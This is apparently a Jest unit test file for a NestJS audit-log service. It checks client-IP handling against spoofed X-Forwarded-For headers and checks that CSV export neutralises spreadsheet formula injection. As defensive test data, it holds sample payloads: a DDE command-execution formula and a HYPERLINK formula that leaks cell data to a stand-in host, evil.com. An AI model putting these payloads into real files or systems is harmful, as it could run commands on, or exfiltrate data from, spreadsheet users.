jest.mock('@nestjs/config', () => ({
  ConfigService: class MockConfigService {
    get = jest.fn();
  },
}));

import { Test, TestingModule } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { AuditLogsService } from './audit-logs.service';
import { AuditLogsRepository } from './audit-logs.repository';
import { AuditLogExportJobRepository } from './repositories/audit-log-export-job.repository';
import { AuditLogScheduleRepository } from './repositories/audit-log-schedule.repository';
import { AuditEntityType } from './enums/audit-entity-type.enum';
import { AuditLog } from './entities/audit-log.entity';

describe('AuditLogsService', () => {
  let service: AuditLogsService;
  let repository: AuditLogsRepository;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        AuditLogsService,
        {
          provide: AuditLogsRepository,
          useValue: {
            createAuditLog: jest.fn(),
            findLogsWithPagination: jest.fn(),
          },
        },
        {
          provide: AuditLogExportJobRepository,
          useValue: {
            createJob: jest.fn(),
            updateJobStatus: jest.fn(),
            getJob: jest.fn(),
          },
        },
        {
          provide: AuditLogScheduleRepository,
          useValue: {
            createSchedule: jest.fn(),
            getDueSchedules: jest.fn(),
            updateLastRun: jest.fn(),
          },
        },
        {
          provide: ConfigService,
          useValue: {
            get: jest.fn(),
          },
        },
      ],
    }).compile();

    service = module.get<AuditLogsService>(AuditLogsService);
    repository = module.get<AuditLogsRepository>(AuditLogsRepository);
  });

  it('should be defined', () => {
    expect(service).toBeDefined();
  });

  describe('createLog', () => {
    it('should create an audit log', async () => {
      const createDto = {
        userId: 'user-123',
        action: 'TEST_ACTION',
        entity: AuditEntityType.SYSTEM,
        ipAddress: '127.0.0.1',
      };

      const mockLog = { id: 'log-123', ...createDto };
      jest
        .spyOn(repository, 'createAuditLog')
        .mockResolvedValue(mockLog as any);

      await service.createLog(createDto);

      expect(repository.createAuditLog).toHaveBeenCalledWith(
        expect.objectContaining(createDto),
      );
    });
  });

  describe('getClientIp', () => {
    it('should return req.ip when present and ignore spoofed X-Forwarded-For header', () => {
      const req = {
        ip: '203.0.113.195',
        headers: {
          'x-forwarded-for': '1.2.3.4, 10.0.0.1',
        },
        socket: {
          remoteAddress: '192.168.1.1',
        },
      };

      const ip = service.getClientIp(req);
      expect(ip).toBe('203.0.113.195');
    });

    it('should fall back to socket.remoteAddress if req.ip is not available', () => {
      const req = {
        socket: {
          remoteAddress: '192.168.1.50',
        },
      };

      const ip = service.getClientIp(req);
      expect(ip).toBe('192.168.1.50');
    });

    it('should return empty string if request is null or undefined', () => {
      expect(service.getClientIp(null)).toBe('');
      expect(service.getClientIp(undefined)).toBe('');
    });
  });

  describe('generateCsvExport', () => {
    it('should neutralise formula injection in userAgent and action fields', () => {
      const mockLogs: AuditLog[] = [
        {
          id: 'log-1',
          createdAt: new Date('2026-11-02T10:00:00Z'),
          userId: 'user-attack',
          action: "=CMD|' /C calc'!'A1'",
          entity: AuditEntityType.SYSTEM,
          entityId: 'ent-1',
          ipAddress: '127.0.0.1',
          userAgent: '=HYPERLINK("http://evil.com/leak?data="&A1)',
        } as unknown as AuditLog,
        {
          id: 'log-2',
          createdAt: new Date('2026-11-02T11:00:00Z'),
          userId: 'user-normal',
          action: 'USER_LOGIN',
          entity: AuditEntityType.AUTH,
          entityId: 'ent-2',
          ipAddress: '10.0.0.2',
          userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        } as unknown as AuditLog,
      ];

      const result = (service as any).generateCsvExport(mockLogs);
      expect(result).toBeDefined();
      expect(result.filename).toMatch(
        /^audit-export-\d{4}-\d{2}-\d{2}-\d{6}\.csv$/,
      );

      const csvContent = result.buffer.toString('utf-8');
      const lines = csvContent.trim().split('\n');

      // Check header
      expect(lines[0]).toBe(
        '"Timestamp","User ID","Action","Entity","Entity ID","IP Address","User Agent"',
      );

      // Check malicious log row: leading = should be neutralised with leading '
      expect(lines[1]).toContain(`"'=CMD|' /C calc'!'A1'"`);
      expect(lines[1]).toContain(
        `"'=HYPERLINK(""http://evil.com/leak?data=""&A1)"`,
      );

      // Check normal log row
      expect(lines[2]).toContain('"USER_LOGIN"');
      expect(lines[2]).toContain('"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"');
    });

    it('should neutralise formula prefixes +, -, and @', () => {
      const mockLogs: AuditLog[] = [
        {
          id: 'log-3',
          createdAt: new Date('2026-11-02T12:00:00Z'),
          userId: '+1234567890',
          action: '-SUM(A1:A5)',
          entity: '@ADMIN' as any,
          entityId: 'ent-3',
          ipAddress: '127.0.0.1',
          userAgent: '+curl/7.68.0',
        } as unknown as AuditLog,
      ];

      const result = (service as any).generateCsvExport(mockLogs);
      const csvContent = result.buffer.toString('utf-8');
      const lines = csvContent.trim().split('\n');

      expect(lines[1]).toContain(`"'+1234567890"`);
      expect(lines[1]).toContain(`"'-SUM(A1:A5)"`);
      expect(lines[1]).toContain(`"'@ADMIN"`);
      expect(lines[1]).toContain(`"'+curl/7.68.0"`);
    });
  });
});
